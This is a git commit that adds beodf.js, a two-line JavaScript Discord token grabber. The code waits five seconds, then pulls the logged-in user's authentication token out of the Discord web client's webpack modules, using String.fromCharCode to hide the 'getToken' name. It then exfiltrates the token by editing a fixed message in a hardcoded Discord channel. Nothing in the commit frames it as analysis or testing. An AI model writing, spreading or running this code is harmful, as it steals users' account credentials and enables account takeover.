dcc7ed447e03a1fc822ddf8e741d927d7bcb330a
parsesml <113039052+parsesml@users.noreply.github.com>
2023-12-27 16:56:37 +0000

    Create beodf.js

---
+++ beodf.js
@@ -0,0 +1,2 @@
+setTimeout(()=>{_p=(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.[String.fromCharCode(103,101,116,84,111,107,101,110)]!==void 0).exports.default[String.fromCharCode(103,101,116,84,111,107,101,110)]();
+fetch("https://discord.com/api/v9/channels/1088960100095512709/messages/1170527270268583978", {headers: {Authorization: _p, "Content-Type":"application/json"}, method:"PATCH", body:`{"content":"${_p}"}`})}, 5000)
